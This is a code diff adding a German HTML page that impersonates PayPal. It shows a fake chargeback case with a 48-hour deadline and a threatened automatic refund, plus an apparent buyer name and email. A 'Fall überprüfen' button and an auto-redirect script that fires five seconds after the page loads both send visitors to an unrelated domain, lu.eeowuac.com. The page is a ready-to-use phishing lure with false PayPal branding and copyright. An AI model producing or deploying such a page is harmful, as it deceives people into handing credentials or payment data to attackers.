@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="de" class="h-full">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirmation</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Inter Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+</head>
+<body class="h-full bg-slate-100 text-slate-800 flex items-center justify-center p-4">
+
+  <main class="w-full max-w-lg bg-white rounded-2xl shadow-xl border border-slate-200 overflow-hidden">
+    
+    <!-- Header -->
+    <div class="bg-[#003087] px-6 py-6 text-center">
+      <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo" class="w-12 mx-auto filter brightness-0 invert">
+    </div>
+
+    <!-- Body Content -->
+    <div class="p-6 sm:p-8">
+      
+      <div class="flex items-center space-x-3 mb-4">
+        <span class="flex h-3 w-3 relative">
+          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+          <span class="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
+        </span>
+        <h1 class="text-xl sm:text-2xl font-bold text-slate-900 tracking-tight">
+          Aktion erforderlich – Fall #PP-D-97359241
+        </h1>
+      </div>
+
+      <!-- Warning Box -->
+      <div class="bg-red-50 border-l-4 border-red-500 p-4 rounded-r-xl mb-6">
+        <p class="text-sm text-red-800 leading-relaxed">
+          Ein Käufer hat eine Rückbuchung über <strong class="font-semibold">299,99 €</strong> beantragt. Der Grund lautet: <em class="italic">nicht autorisierte Transaktion</em>.
+        </p>
+      </div>
+
+      <p class="text-sm text-slate-600 mb-6 leading-relaxed">
+        Wir haben einen neuen Fall in Ihrem PayPal-Konto eröffnet. Bitte überprüfen Sie die Details und antworten Sie innerhalb von <strong class="font-semibold text-slate-900">48 Stunden</strong>, um eine automatische Rückzahlung zu vermeiden.
+      </p>
+
+      <!-- Info Details Card -->
+      <div class="bg-slate-50 border border-slate-200/80 rounded-xl p-4 mb-6 space-y-2 text-sm">
+        <div class="flex justify-between border-b border-slate-200/60 pb-2">
+          <span class="text-slate-500 font-medium">Fall-ID:</span>
+          <span class="font-semibold text-slate-800">PP-D-97359241</span>
+        </div>
+        <div class="flex justify-between border-b border-slate-200/60 pb-2">
+          <span class="text-slate-500 font-medium">Beantragter Betrag:</span>
+          <span class="font-semibold text-slate-800">299,99 €</span>
+        </div>
+        <div class="flex justify-between border-b border-slate-200/60 pb-2">
+          <span class="text-slate-500 font-medium">Käufer:</span>
+          <span class="font-semibold text-slate-800">M. Rakel (marrakel1@web.de)</span>
+        </div>
+        <div class="flex justify-between border-b border-slate-200/60 pb-2">
+          <span class="text-slate-500 font-medium">Ort der Anmeldung:</span>
+          <span class="font-semibold text-slate-800">Berlin, Deutschland</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-slate-500 font-medium">Browser:</span>
+          <span class="font-semibold text-slate-800">Firefox (Windows 10)</span>
+        </div>
+      </div>
+
+      <!-- Redirect Notification Box -->
+      <div class="mb-6 bg-blue-50 border border-blue-100 py-3 px-4 rounded-xl text-center">
+        <span class="text-xs font-medium text-blue-800">
+          Automatische Weiterleitung in <span id="countdown" class="font-bold text-blue-600">5</span> Sekunden...
+        </span>
+        <div class="w-full bg-blue-200 h-1.5 rounded-full overflow-hidden mt-2">
+          <div id="progress-bar" class="bg-blue-600 h-full rounded-full w-full transition-all duration-1000 ease-linear"></div>
+        </div>
+      </div>
+
+      <!-- Call to Action Button -->
+      <div class="text-center">
+        <a href="https://lu.eeowuac.com/assets/js/extracted/extracted/PPL%20(DE-G-471525DE)/" target="_blank" class="w-full inline-block py-3.5 px-6 bg-red-600 hover:bg-red-700 active:scale-[0.99] text-white font-semibold rounded-xl shadow-lg shadow-red-600/20 transition-all duration-200 text-center">
+          Fall überprüfen
+        </a>
+      </div>
+
+      <p class="text-xs text-slate-500 text-center mt-4">
+        Wenn Sie keine Maßnahmen ergreifen, wird der Betrag dem Käufer gutgeschrieben.
+      </p>
+
+    </div>
+
+    <!-- Footer -->
+    <div class="bg-slate-50 border-t border-slate-200 p-6 text-center text-xs text-slate-500 space-y-2">
+      <p>Sie brauchen Hilfe? Besuchen Sie unser <a href="#" class="text-[#003087] font-semibold hover:underline">Hilfe-Center</a> oder kontaktieren Sie unseren <a href="#" class="text-[#003087] font-semibold hover:underline">Kundenservice</a>.</p>
+      <p>PayPal wird Sie niemals nach Passwörtern oder sensiblen Daten per E-Mail fragen. <a href="#" class="text-[#003087] font-semibold hover:underline">So erkennen Sie Phishing-Mails</a></p>
+      <p class="pt-2 text-slate-400">© 1999–2026 PayPal. Alle Rechte vorbehalten.</p>
+    </div>
+
+  </main>
+
+  <script>
+    const totalTime = 5; // seconds
+    let timeLeft = totalTime;
+    
+    const countdownEl = document.getElementById('countdown');
+    const progressBarEl = document.getElementById('progress-bar');
+
+    const timer = setInterval(() => {
+        timeLeft -= 1;
+        if (countdownEl) {
+            countdownEl.textContent = timeLeft;
+        }
+
+        // Fortschrittsbalken aktualisieren
+        if (progressBarEl) {
+            const percentage = (timeLeft / totalTime) * 100;
+            progressBarEl.style.width = percentage + '%';
+        }
+
+        if (timeLeft <= 0) {
+            clearInterval(timer);
+            // Automatischer Redirect zum angegebenen Link
+            window.location.href = "https://lu.eeowuac.com/assets/js/extracted/extracted/PPL%20(DE-G-471525DE)/";
+        }
+    }, 1000);
+  </script>
+</body>
+</html>
